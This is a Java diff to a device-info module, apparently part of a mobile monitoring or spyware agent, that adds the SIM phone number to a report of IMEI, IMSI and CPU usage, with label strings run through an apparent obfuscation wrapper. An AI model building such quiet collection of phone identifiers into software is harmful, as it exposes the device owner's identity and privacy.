@@ -203,10 +203,18 @@ public class ModuleDevice extends BaseInstantModule {
 
 		sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
+		boolean imsi = false;
 		if (Device.self().getImei().length() == 0) {
 			sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
 		} else {
 			sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			imsi = true;
+		}
+
+		if (Device.self().getPhoneNumber().length() == 0) {
+			sb.append(M.e("PhoneNumber: ") + (imsi? M.e("unknown"): M.e("SIM not present")) +  "\n"); //$NON-NLS-1$
+		} else {
+			sb.append(M.e("PhoneNumber: ") + Device.self().getPhoneNumber() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		sb.append(M.e("CpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
